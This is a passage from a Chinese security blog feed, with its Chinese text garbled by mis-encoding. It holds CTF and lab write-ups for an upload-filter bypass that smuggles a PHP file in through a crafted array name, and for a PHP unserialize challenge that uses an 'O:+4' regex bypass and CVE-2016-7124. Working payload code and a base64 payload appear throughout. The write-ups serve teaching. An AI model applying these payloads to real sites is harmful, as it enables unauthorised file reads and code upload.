align="left">å¯é€‰ã€‚è§„å®šæ‰€è¿”å›çš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚å¯èƒ½çš„å€¼ï¼š<br />å¤§äº 0 - è¿”å›åŒ…å«æœ€å¤š <em>limit</em> ä¸ªå…ƒç´ çš„æ•°ç»„<br />å°äº 0 - è¿”å›åŒ…å«é™¤äº†æœ€åçš„ -<em>limit</em> ä¸ªå…ƒç´ ä»¥å¤–çš„æ‰€æœ‰å…ƒç´ çš„æ•°ç»„<br />0 - è¿”å›åŒ…å«ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„</td></tr><tr><td align="left">è¿”å›å€¼ï¼š</td><td align="left">è¿”å›å­—ç¬¦ä¸²çš„æ•°ç»„</td></tr></tbody></table><p>æ•°ç»„æœ€åä¸€ä¸ªçš„å€¼(<code>end</code>å‡½æ•°å°±æ˜¯å–æ•°ç»„æœ€åä¸€ä¸ªçš„å€¼)åŒç™½åå•åšæ¯”è¾ƒï¼Œç¬¦åˆjpgã€pngã€gifä¸­çš„ä¸€ç§å°±å…è®¸ä¸Šä¼ äº†</p><p>â€‹    åœ¨å…è®¸ä¸Šä¼ ä¹‹åè¿˜è¦æŠŠæ•°ç»„çš„å€¼æ‹¼æ¥åœ¨ä¸€èµ·å¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ :</p><ul><li><code>save_name[0]=tao.php/</code></li><li><code>save_name[1]ç½®ä¸ºç©º</code></li><li><code>save_name[2]=jpg</code>(ç™½åå•åç¼€æ ¡éªŒ)</li></ul><blockquote><p><code>reset()</code> å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</p></blockquote><p><code>reset($file)</code>å–çš„æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å³<code>tao.php/</code>ï¼Œç„¶åæ¥äº†ä¸€ä¸ªâ€™.â€™ç¬¦å·ï¼Œä¹‹ååˆå°†æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ å†…å®¹æ‹¼æ¥åˆ°ä¸€èµ·</p><p>Qï¼šå¯èƒ½æœ‰çš„äººä¼šç–‘é—®æ•°ç»„æœ€åä¸€ä¸ªå€¼ä¸æ˜¯jpgå—ï¼Ÿ</p><p>Aï¼šå…¶å®å½“æˆ‘ä»¬åªè®¾ç½®äº†ä¸¤ä¸ªæ•°ç»„å…ƒç´ çš„æ—¶å€™ï¼Œæ•°ç»„çš„å…ƒç´ ä¸ªæ•°å°±åªæœ‰ä¸¤ä¸ªäº†ã€‚åŸå› å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103223547471.png" alt="image-20201103223547471"></p><p>ä¹‹åç¬¬20å¯¹<code>$file_name</code>è¿›è¡Œçš„æ‹¼æ¥ï¼Œå› ä¸º<code>$save_name[2-1] = $save_name[1] =ç©º</code>, æ‰€ä»¥æœ€å<code>$file_name</code>çš„å€¼ä¸º<code>tao.php/.</code></p><p>é‚£ä¹ˆæœ€ååˆ©ç”¨åŸç†å°±è·Ÿ<code>Pass19</code>ä¸€æ ·äº†ï¼Œå¯¹äºåƒ<code>tao.php/.</code>è¿™æ ·çš„æ–‡ä»¶è·¯å¾„ï¼Œ<code>move_uploaded_file()</code>å‡½æ•°ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„<code>/.</code>ã€‚å¦‚æ­¤ä¸€æ¥ä¸Šä¼ çš„å°±æ˜¯phpæ–‡ä»¶åç¼€äº†</p><h3 id="2-åˆ©ç”¨-17"><a href="#2-åˆ©ç”¨-17" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p>burpæŠ“åŒ…ä¸Šä¼ </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103224558867.png" alt="image-20201103224558867"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103224634474.png" alt="image-20201103224634474"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103224652060.png" alt="image-20201103224652060"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;è¯´æ˜ï¼šåšé¢˜å‰å…ˆæ¸…ç©ºä¹‹å‰å…³å¡ä¸Šä¼ çš„æ–‡ä»¶&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Pass-01-jsæ£€æŸ¥&quot;&gt;&lt;a href=&quot;#Pass-01-jsæ£€æŸ¥&quot; class=&quot;headerlink&quot; title=&quot;Pass-01 jsæ£€æŸ¥&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="webå®‰å…¨" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="phpå®‰å…¨" scheme="https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-Web_php_unserialize Writeup</title>
    <link href="https://taonn.github.io/2020/10/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-unserialize-Writeup/"/>
    <id>https://taonn.github.io/2020/10/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-unserialize-Writeup/</id>
    <published>2020-10-22T02:51:00.000Z</published>
    <updated>2021-03-16T05:27:56.125Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>ä»£ç æ˜¯ä»17è¡Œå¼€å§‹æ‰§è¡Œçš„ï¼š</p><ol><li><p>é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨<strong>GET</strong>å‚æ•°<code>var</code>, è‹¥å­˜åœ¨åˆ™å¯¹å…¶è¿›è¡Œ<code>Base64</code>è§£ç åå­˜å…¥<code>$var</code>å˜é‡ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œæ‰§è¡Œ25è¡Œçš„ä»£ç ï¼Œé«˜äº®è¾“å‡ºå½“å‰é¡µé¢çš„æºç </p></li><li><p>è§£ç åå¯¹<code>$var</code>è¿›è¡Œä¸€ä¸ªæ­£åˆ™çš„åŒ¹é…ï¼ŒåŒ¹é…åˆ°çš„è¯ç›´æ¥ç»“æŸï¼ˆ<code>die</code>ï¼‰å¹¶æ˜¾ç¤º <strong>stop hacking!**ï¼Œå¦‚æœæ²¡åŒ¹é…åˆ°å°±</strong>ååºåˆ—åŒ–**</p></li></ol><p>æºä»£ç ä¸­ç»™å‡ºäº†<code>Demo</code>ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“è¿™<strong>ä¸‰ä¸ªé­”æœ¯æ–¹æ³•</strong>ï¼š</p><ul><li><p><code>__construct()</code>ï¼šphpæ„é€ æ–¹æ³•ï¼Œå…·æœ‰æ„é€ æ–¹æ³•çš„ç±»ä¼šåœ¨<font color="red">æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡å‰è°ƒç”¨æ­¤æ–¹æ³• </font>ï¼Œè¯¥æ–¹æ³•å¸¸ç”¨äºå®Œæˆä¸€äº›åˆå§‹åŒ–å·¥ä½œï¼Œ</p></li><li><p><code>__destruct()</code>ï¼šphpææ„æ–¹æ³•ï¼Œå½“<font color="red"> <strong>æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤</strong> </font>æˆ–è€… <font color="red"><strong>å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯</strong></font> æ—¶ï¼Œä¼šæ‰§è¡Œæ­¤æ–¹æ³•ã€‚</p></li><li><p><code>__wakeup()</code>ï¼šPHPååºåˆ—åŒ–æ—¶æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼Œ <code>unserialize()</code>ä¼šå…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨ <code>__wakeup()</code> æ–¹æ³• ï¼Œ è‹¥å­˜åœ¨åˆ™ä¼šå…ˆè°ƒç”¨è¯¥æ–¹æ³• ï¼Œ æ¥é¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æº( æ¯”å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ ï¼Œ æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œç­‰ç­‰ )</p></li></ul><blockquote><p>æ›´å¤šæœ‰å…³PHPé­”æ³•æ–¹æ³•çš„å†…å®¹å¯ä»¥å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p></blockquote><p>æ¥ä¸‹æ¥åˆ†æ<code>Demo</code>ç±»ï¼Œ</p><ol><li>æ‰§è¡Œ<code>__construct()</code>æ–¹æ³•ï¼Œå°†ä¼ å…¥çš„ <code>$file</code> èµ‹å€¼ç»™æœ¬åœ°çš„<strong>ç§æœ‰</strong>æ–¹æ³• <code>$file</code></li><li>é”€æ¯æ—¶æ‰§è¡Œ <code>__destruct()</code> æ–¹æ³•ï¼Œé«˜äº®æœ¬åœ°å˜é‡ <code>$file</code>æ‰€æŒ‡å‘ æ–‡ä»¶çš„ä»£ç </li></ol><p>è¿™é‡Œéœ€è¦æ³¨æ„ç¬¬12è¡Œçš„æ³¨é‡Šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//the secret is in the fl4g.php</span></span><br></pre></td></tr></table></figure><p>æ˜ç¤ºäº†æˆ‘ä»¬flagåœ¨<code>fl4g.php</code>æ–‡ä»¶ä¸­</p><h3 id="åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022095600381.png" alt="image-20201022095600381"></p><blockquote><p>æ›´è¯¦ç»†çš„è¯´æ˜ï¼Œå‚è€ƒï¼š<a href="https://www.cnblogs.com/youyoui/p/8610068.html">æ·±åº¦å‰–æPHPåºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></p></blockquote><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸¤ä¸ªç‚¹ï¼Œä¸Šé¢çš„ä»£ç æ˜¯ä»17è¡Œå¼€å§‹æ‰§è¡Œçš„ï¼Œè€Œä¸”<code>unserialize()</code>æ–¹æ³•çš„å‚æ•°æ¥æºä¸GETè¯·æ±‚ï¼Œè¯·æ±‚å€¼ç»è¿‡äº†<code>base64</code> å’Œ æ­£åˆ™åŒ¹é…ï¼Œ ä¸»è¦çš„æ˜¯<font color="red">å‚æ•°æ˜¯å¯æ§çš„ï¼ˆå¯¹ä¸æˆ‘ä»¬æ¥è¯´ï¼‰</font></p><p>è¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„ç‚¹å°±æ˜¯<code>__wakeup()</code>æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬çš„flagåœ¨<code>fl4g.php</code>æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡<code>__wakeup()</code>å‡½æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨<code>CVE-2016-7124</code>çš„æ¼æ´ï¼š<font color="red">å³å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡<code>__wakeup</code>çš„æ‰§è¡Œ</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç‚¹è¯´æ˜ï¼Œå°±æ˜¯è¿™é‡Œæ­£åˆ™åŒ¹é…çš„è§„åˆ™æ˜¯: <strong>åœ¨ä¸åŒºåˆ†å¤§å°å†™çš„æƒ…å†µä¸‹ ï¼Œ è‹¥å­—ç¬¦ä¸²å‡ºç° â€œo:æ•°å­—â€ æˆ–è€… â€œc:æ•°å­—â€™ è¿™æ ·çš„æ ¼å¼ ï¼Œ é‚£ä¹ˆå°±è¢«è¿‡æ»¤</strong> . è€Œ<code>serialize()</code> çš„å‚æ•°ä¸º object ï¼Œå› æ­¤å‚æ•°ç±»å‹è‚¯å®šä¸ºå¯¹è±¡ â€œ O â€œ ï¼Œ åˆå› ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼ä¸º <code>å‚æ•°æ ¼å¼:å‚æ•°åé•¿åº¦</code> ï¼Œ å› æ­¤ <code>&quot; O:4 &quot;</code> è¿™æ ·çš„å­—ç¬¦ä¸²è‚¯å®šæ— æ³•é€šè¿‡æ­£åˆ™åŒ¹é…</p><p>ç»•è¿‡æ­£åˆ™çš„åŒ¹é…ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>4</code>åŠ ä¸Š<code>+</code>æ¥ç»•è¿‡ï¼Œå› ä¸ºåœ¨ php è¯­æ³•ä¸­ï¼Œ<code>+4</code> = <code>4</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> +<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">-4</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022101504648.png" alt="image-20201022101504648"></p><blockquote><p>æ›´æ·±å…¥çš„äº†è§£å¯ä»¥å‚è€ƒï¼š<a href="https://www.phpbug.cn/archives/32.html">phpååºåˆ—unserializeçš„ä¸€ä¸ªå°ç‰¹æ€§</a></p></blockquote><p>ç»•è¿‡<code>__wakeup()</code>ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨<code>CVE-2016-7124</code>çš„æ¼æ´ï¼š<font color="red">å³å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡<code>__wakeup</code>çš„æ‰§è¡Œ</font></p><h2 id="æ„é€ pyload"><a href="#æ„é€ pyload" class="headerlink" title="æ„é€ pyload"></a>æ„é€ pyload</h2><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022101902130.png" alt="image-20201022101902130"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$t = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">$b = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">// O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">$b = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, $b); <span class="comment">//ç»•è¿‡preg_match</span></span><br><span class="line">$b = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, $b);  <span class="comment">//ç»•è¿‡__wakeup</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">// O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¸ºä»€ä¹ˆç”¨<code>str_replace()</code>æ›¿æ¢ï¼Œè€Œä¸æ˜¯ç›´æ¥å¤åˆ¶ç²˜è´´ï¼Œç„¶åç¼–ç å‘¢? è¿™å°±æ¶‰åŠåˆ°ç§æœ‰å±æ€§åºåˆ—åŒ–ä»¥åï¼Œä¼šäº§ç”Ÿ<code>%00</code>çš„é—®é¢˜ï¼Œåé¢è¯¦ç»†åˆ†æï¼Œ æˆ‘ä»¬é€šè¿‡æ€è·¯ï¼Œæ„é€ payloadå¦‚ä¸‹ï¼š</p><p><code>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022102111486.png" alt="image-20201022102111486"></p><p><strong>è§£é‡Šä¸€ä¸‹ä¸Šé¢çš„é—®é¢˜</strong></p><p><code>Demo</code>ç±»åºåˆ—åŒ–çš„ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;Demo&quot;</span>:1:&#123;s:10:<span class="string">&quot;Demofile&quot;</span>;s:8:<span class="string">&quot;fl4g.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„<code>s:10:&quot;Demofile&quot;</code>, æ˜æ˜<code>Demofile</code>æ˜¯8ä¸ªå­—ç¬¦ï¼Œ ä¸ºä»€ä¹ˆè¿™é‡Œæ˜¾ç¤ºs:10å‘¢?</p><p>ä¸ºäº†æ›´æ¸…æ™°çš„æ˜¾ç¤ºä¸ºä»€ä¹ˆï¼Œæˆ‘ä»¬ç”¨<code>urlencode()</code>æ‰“å°ä¸Šé¢çš„å€¼</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022102906234.png" alt="image-20201022102906234"></p><p>è¿™é‡Œ<code>s:10</code>, å°±æ˜¯å› ä¸ºè¿™é‡Œä¸¤ä¸ª<code>%00</code>å¯¼è‡´çš„ã€‚</p><p>è¿™é‡Œä¸ºä»€ä¹ˆè¦è¯´è¿™ä¸ªï¼Ÿ<code>%00</code>æœ‰ä»€ä¹ˆå½±å“å˜›?</p><p><font color="red">è¿™é‡Œçš„å‘å°±åœ¨</font>ï¼šå¦‚æœæˆ‘ä»¬ç›´æ¥å¤åˆ¶æ–‡æœ¬è¿›è¡Œbase64ç¼–ç ï¼Œä¼šä¸¢å¤±<code>%00</code>, å† <code>è§£ç -&gt;ååºåˆ—åŒ–</code> è‡ªç„¶ä¸æˆ‘ä¹‹å‰åºåˆ—åŒ–çš„ Demo <code>ä¸ç›¸åŒ</code></p><p>å¯¹äºè¿™é‡Œï¼Œè§£å†³æ–¹æ³•å°±æ˜¯ï¼Œä½¿ç”¨<code>str_replace</code>æ›¿æ¢ï¼Œ æˆ‘ä»¬é€šè¿‡å¯¹æ¯”ï¼Œæ¥è§‚å¯Ÿä¸€ä¸‹ä»–ä»¬æœ‰ä»€ä¹ˆä¸åŒï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$t = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">$b = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">// O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line">$b = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, $b); <span class="comment">//ç»•è¿‡preg_match</span></span><br><span class="line">$b = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, $b);  <span class="comment">//ç»•è¿‡__wakeup</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_decode(<span class="string">&quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_decode(<span class="string">&quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022104425304.png" alt="image-20201022104425304"></p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><ul><li>php ä¸­ <code>4</code> = <code>+4</code> 